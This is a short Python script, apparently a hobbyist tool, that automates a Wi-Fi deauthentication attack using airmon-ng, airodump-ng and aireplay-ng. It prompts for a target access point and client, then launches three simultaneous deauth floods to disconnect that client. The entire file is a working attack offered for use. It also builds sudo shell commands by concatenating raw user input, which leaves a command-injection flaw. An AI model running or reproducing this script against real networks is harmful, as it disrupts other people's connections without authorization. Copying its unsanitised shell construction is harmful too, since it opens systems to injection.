import os
from time import sleep

def client_attack():
    os.system("sudo airmon-ng")
    bs = input("input interface: ")
    os.system("konsole --hold -geometry 800x500 -e sudo airodump-ng " + bs + " &")
    sleep(3.0)
    os.system("clear")
    bssid  = input("bssid: ")
    channel = input("channel: ")
    os.system("konsole --hold -geometry 800x500 -e sudo airodump-ng " "-c " + channel + " --bssid " + bssid + " " + bs + " &")
    sleep(5.0)
    os.system("clear")
    print("copy station")
    client = input("client: ")
    print("it's up to you as long as the example number is 0")
    deau = input("deauth: ")
    os.system("konsole --hold -geometry 800x500 -e sudo airodump-ng " "-c " + channel + " --bssid " + bssid + " " + bs + " &")
    os.system("xterm -hold -bg black -fg red -geometry 150x35 -e sudo aireplay-ng --deauth " + deau + " -a " + bssid + " -c " + client + " " + bs + " &")
    os.system("xterm -hold -bg black -fg red -geometry 150x35 -e sudo aireplay-ng --deauth " + deau + " -a " + bssid + " -c " + client + " " + bs + " &")
    os.system("xterm -hold -bg black -fg red -e sudo aireplay-ng --deauth " + deau + " -a " + bssid + " -c " + client + " " + bs)
    sleep(5.0)
    print("out")

client_attack()
